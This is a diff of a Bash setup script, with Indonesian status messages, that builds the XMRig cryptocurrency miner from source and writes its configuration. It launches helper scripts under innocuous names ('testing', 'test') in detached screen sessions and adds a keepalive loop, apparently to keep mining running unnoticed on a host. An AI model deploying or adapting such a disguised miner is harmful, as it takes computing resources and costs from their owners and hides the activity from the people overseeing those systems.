@@ -7,17 +7,19 @@ sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools
 
 echo "[2] Clone xmrig..."
-git clone https://github.com/xmrig/xmrig.git
+git clone https://github.com/xmrig/xmrig.git || true
+
 cd xmrig
 
 echo "[3] Build xmrig..."
-mkdir build
+mkdir -p build
 cd build
 
 cmake ..
 make -j$(nproc)
 
 echo "[4] Create config.json..."
+
 cat > config.json << 'EOF'
 {
     "api": {
@@ -82,6 +84,7 @@ cat > config.json << 'EOF'
 EOF
 
 echo "[5] Create run_testing.sh..."
+
 cat > run_testing.sh << 'EOF'
 #!/bin/bash
 
@@ -108,6 +111,7 @@ EOF
 chmod +x run_testing.sh
 
 echo "[6] Create test.sh..."
+
 cat > test.sh << 'EOF'
 #!/bin/bash
 
@@ -129,22 +133,36 @@ EOF
 
 chmod +x test.sh
 
-echo "[7] Start screen sessions..."
+echo "[7] Create keepalive.sh..."
+
+cat > keepalive.sh << 'EOF'
+#!/bin/bash
+
+while true
+do
+    date > /dev/null
+    echo "keep-alive $(date)"
+    sleep 60
+done
+EOF
+
+chmod +x keepalive.sh
+
+echo "[8] Start screen sessions..."
 
 screen -dmS testing bash -c "./run_testing.sh"
 screen -dmS test bash -c "./test.sh"
+screen -dmS keepalive bash -c "./keepalive.sh"
 
 echo ""
 echo "=============================="
 echo "✅ Setup selesai!"
 echo ""
-echo "Screen aktif:"
+echo "Cek screen:"
 echo "screen -ls"
 echo ""
-echo "Masuk session:"
+echo "Masuk screen:"
 echo "screen -r testing"
 echo "screen -r test"
-echo ""
-echo "Cek proses:"
-echo "ps aux | grep testing"
+echo "screen -r keepalive"
 echo "=============================="
